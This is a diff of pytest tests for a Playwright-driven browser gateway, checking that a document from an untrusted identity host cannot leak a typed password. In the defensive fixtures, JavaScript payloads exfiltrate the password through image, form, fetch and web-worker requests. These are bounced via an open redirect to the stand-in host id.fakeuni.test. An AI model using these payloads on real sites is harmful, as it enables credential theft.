@@ -105,7 +105,7 @@ async def test_a_server_redirect_to_an_armed_host_is_not_a_page_of_the_connectio
     assert handle.page.url == "about:blank"
 
 
-async def test_what_a_foreign_document_asks_for_is_refused_whether_or_not_it_was_taken_away(
+async def test_what_a_foreign_document_asks_for_is_refused_by_the_gate_alone(
     open_browser: Opener, monkeypatch: pytest.MonkeyPatch
 ) -> None:
     """The probe of the review: the form on the armed host is filled and the value leaves as an
@@ -114,7 +114,12 @@ async def test_what_a_foreign_document_asks_for_is_refused_whether_or_not_it_was
     async def stay(_self: PlaywrightHandle) -> None:
         return None
 
+    async def stay_there(_page: Any) -> None:
+        return None
+
     monkeypatch.setattr(PlaywrightHandle, "_quarantine", stay)
+    monkeypatch.setattr(PlaywrightHandle, "_blank", staticmethod(stay_there))
+    monkeypatch.setattr(PlaywrightHandle, "_lock_down", stay)  # the gate alone, then
     handle = await open_browser()
     await handle.goto(f"{ORIGIN}/assets/data")
     await arm(handle, IDP)
@@ -281,3 +286,189 @@ async def test_when_the_student_allows_the_host_the_login_goes_on_there(
     assert IDP in rig.store.connections[(rig.user, rig.conn)].allow_hosts
     assert filled  # typed, on the host the student allowed
     assert session.asset_hosts == []  # an allowed host is a login host, not an asset
+
+
+# ------------------------------------------------- a foreign document that is still on its page
+#
+# The quarantine takes the page to about:blank, but a document that is quicker (or a flow that
+# is not yet told) must not be able to send anything meanwhile: the first taint shuts the context.
+# These tests keep the document on its page (the quarantine is switched off) to prove it.
+
+
+@pytest.fixture
+def stays_on_the_page(monkeypatch: pytest.MonkeyPatch) -> None:
+    async def stay(_self: PlaywrightHandle) -> None:
+        return None
+
+    async def stay_there(_page: Any) -> None:
+        return None
+
+    monkeypatch.setattr(PlaywrightHandle, "_quarantine", stay)
+    monkeypatch.setattr(PlaywrightHandle, "_blank", staticmethod(stay_there))
+
+
+async def foreign_page(open_browser: Opener) -> PlaywrightHandle:
+    """A handle whose page is a document of the armed identity host, and which has been told."""
+    handle = await open_browser()
+    await handle.goto(f"{ORIGIN}/assets/data")
+    await arm(handle, IDP)
+    with pytest.raises(BotaiError):
+        await handle.goto(f"{ORIGIN}/sso/start")
+    assert handle.page.url.startswith(f"https://{IDP}/sso/login")  # still there
+    return handle
+
+
+def leaks(host: str = IDP) -> list[dict[str, str | None]]:
+    return [r for r in ASSETS.to(host) if PASSWORD in str(r["query"]) or PASSWORD in str(r["body"])]
+
+
+BOUNCE_VIA_IMAGE = """(pw) => new Promise((resolve) => {
+    const image = new Image();
+    image.onload = () => resolve('sent');
+    image.onerror = () => resolve('refused');
+    image.src = 'https://fakeuni.test/redirect/open?to=' + encodeURIComponent(
+      'https://id.fakeuni.test/assets/x.png?p=' + pw);
+})"""
+
+BOUNCE_VIA_FORM = """(pw) => {
+    const form = document.createElement('form');
+    form.method = 'post';
+    form.action = 'https://fakeuni.test/redirect/open?code=307&to=' + encodeURIComponent(
+      'https://id.fakeuni.test/assets/data?p=' + pw);
+    const field = document.createElement('input');
+    field.name = 'p'; field.value = pw;
+    form.append(field);
+    document.body.append(form);
+    form.submit();
+}"""
+
+BOUNCE_VIA_FETCH = """(pw) => fetch('https://fakeuni.test/redirect/open?code=307&to=' + encodeURIComponent(
+      'https://id.fakeuni.test/assets/data'), {method: 'POST', body: pw, mode: 'no-cors'})
+    .then(() => 'sent', () => 'refused')"""
+
+
+@pytest.mark.parametrize("how", ["image", "form", "fetch"])
+async def test_a_foreign_document_cannot_bounce_a_value_through_an_open_redirect_of_an_allowed_host(
+    open_browser: Opener, stays_on_the_page: None, how: str
+) -> None:
+    """The first hop goes to an allowed host (the asset gate does not look at those), the redirect
+    sends the value on to the armed host. With the context shut, nothing leaves."""
+    handle = await foreign_page(open_browser)
+    await handle.page.fill("#pw", PASSWORD)
+    script = {"image": BOUNCE_VIA_IMAGE, "form": BOUNCE_VIA_FORM, "fetch": BOUNCE_VIA_FETCH}[how]
+    outcome = await handle.page.evaluate(script, PASSWORD)
+    await asyncio.sleep(0.6)
+    assert outcome in {None, "refused"}  # (a form submission has no answer: the page is left)
+    assert leaks() == []
+
+
+async def test_without_the_lockdown_the_same_bounce_leaks(
+    open_browser: Opener, stays_on_the_page: None, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The control of the tests above: what the review found. Only the lockdown stops it."""
+
+    async def open_context(_self: PlaywrightHandle) -> None:
+        return None
+
+    monkeypatch.setattr(PlaywrightHandle, "_lock_down", open_context)
+    handle = await foreign_page(open_browser)
+    await handle.page.fill("#pw", PASSWORD)
+    await handle.page.evaluate(BOUNCE_VIA_IMAGE, PASSWORD)
+    for _ in range(60):
+        if leaks():
+            break
+        await asyncio.sleep(0.05)
+    assert leaks(), "the probe no longer reaches the server: the tests above prove nothing"
+
+
+async def test_a_worker_of_a_foreign_document_cannot_send_either(
+    open_browser: Opener, stays_on_the_page: None
+) -> None:
+    """A dedicated worker has no frame, so the asset gate cannot tell whose it is."""
+    handle = await foreign_page(open_browser)
+    await handle.page.fill("#pw", PASSWORD)
+    await handle.page.evaluate(
+        """(pw) => new Promise((resolve) => {
+            const code = "try { importScripts('https://id.fakeuni.test/assets/x.png?p=" + pw +
+                         "'); } catch (e) {} postMessage('done');";
+            const worker = new Worker(URL.createObjectURL(new Blob([code])));
+            worker.onmessage = () => resolve('done');
+            setTimeout(() => resolve('timeout'), 3000);
+        })""",
+        PASSWORD,
+    )
+    await asyncio.sleep(0.3)
+    assert leaks() == []
+
+
+async def test_a_window_opened_after_the_flow_was_stopped_is_not_adopted_and_does_not_load(
+    open_browser: Opener, stays_on_the_page: None
+) -> None:
+    handle = await foreign_page(open_browser)
+    original = handle.page
+    opened: list[Any] = []
+    handle.context.on("page", lambda page: opened.append(page))
+    await handle.page.evaluate("() => { window.open('https://fakeuni.test/sso/start'); }")
+    for _ in range(100):
+        if opened and opened[0].is_closed():
+            break
+        await asyncio.sleep(0.05)
+    assert opened, "the window never opened"
+    assert opened[0].is_closed()  # discarded
+    assert handle.page is original  # the remote screen keeps the page it had
+
+
+async def test_a_window_opened_before_the_taint_is_taken_off_the_document_too(
+    open_browser: Opener,
+) -> None:
+    handle = await open_browser()
+    await handle.goto(f"{ORIGIN}/assets/data")
+    await arm(handle, IDP)
+    await handle.page.evaluate("() => { window.open('/sso/start'); }")
+    error = await tainted(handle)
+    assert error.extra == {"host": IDP}
+    for _ in range(100):
+        if all(
+            page.url in {"about:blank", ""} or page.is_closed() for page in handle.context.pages
+        ):
+            break
+        await asyncio.sleep(0.05)
+    assert all(page.url in {"about:blank", ""} or page.is_closed() for page in handle.context.pages)
+
+
+# ------------------------------------------------------------------ what a stopped flow is told
+
+
+async def test_an_action_that_fails_after_the_taint_reports_the_host_not_a_missing_field(
+    open_browser: Opener, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setattr("botai.browser.gateway.ACTION_TIMEOUT_MS", 800)
+    handle = await open_browser()
+    await handle.goto(f"{ORIGIN}/assets/data")
+    await arm(handle, IDP)
+    await handle.page.evaluate("() => setTimeout(() => { location = '/sso/start'; }, 100)")
+    for action in (
+        handle.click("#never-there"),
+        handle.press("#never-there", "Enter"),
+        handle.fill("#never-there", PASSWORD),
+    ):
+        with pytest.raises(BotaiError) as exc:
+            await action
+        assert exc.value.code == ErrorCode.EGRESS_BLOCKED, exc.value.detail
+        assert exc.value.extra == {"host": IDP}
+
+
+async def test_fill_never_types_into_a_document_that_arrived_while_it_waited_for_its_field(
+    open_browser: Opener, stays_on_the_page: None
+) -> None:
+    """The review's race: `#pw` exists only on the identity host's page, which the connection's
+    page navigates to 300 ms later. A fill by selector would wait, find it there and type."""
+    handle = await open_browser()
+    await handle.goto(f"{ORIGIN}/assets/data")
+    await arm(handle, IDP)
+    await handle.page.evaluate("() => setTimeout(() => { location = '/sso/start'; }, 300)")
+    with pytest.raises(BotaiError) as exc:
+        await handle.fill("#pw", PASSWORD)
+    assert exc.value.code == ErrorCode.EGRESS_BLOCKED
+    assert exc.value.extra == {"host": IDP}
+    assert await handle.page.input_value("#pw") == ""  # nothing was typed
